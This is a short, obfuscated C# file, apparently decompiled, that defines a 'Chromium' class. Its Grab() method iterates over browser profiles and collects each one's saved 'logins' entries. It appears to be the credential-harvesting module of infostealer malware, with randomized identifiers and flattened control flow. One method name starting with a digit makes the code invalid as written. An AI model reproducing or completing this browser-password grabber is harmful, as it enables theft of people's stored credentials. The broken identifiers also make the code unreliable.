using System;
using System.Collections.Generic;
using C6Zy;
using UCgTB4iR;

namespace rk937aHHc
{
	public class Chromium : EtbH
	{
		public Chromium()
		{
			this.lXxSJLB53fy = "";
		}

		public string lXxSJLB53fy { get; set; }

		public List<WTitxI2m> Grab()
		{
			int num = 0;
			List<WTitxI2m> list;
			List<AH9.ttg>.Enumerator enumerator;
			do
			{
				if (num == 1)
				{
					list = new List<WTitxI2m>();
					num = 2;
				}
				if (num == 2)
				{
					enumerator = AH9.ABaScUmY.GetEnumerator();
					num = 3;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 3);
			try
			{
				while (enumerator.MoveNext())
				{
					AH9.ttg ttg = enumerator.Current;
					if (ttg.WrHknQjA65O)
					{
						list.AddRange(UCgTB4iR.SetupDataLists.8PquFLl3p(ttg.KZkdvgD, ttg.NG21r7PAik, "logins"));
					}
				}
			}
			finally
			{
				((IDisposable)enumerator).Dispose();
			}
			return list;
		}
	}
}
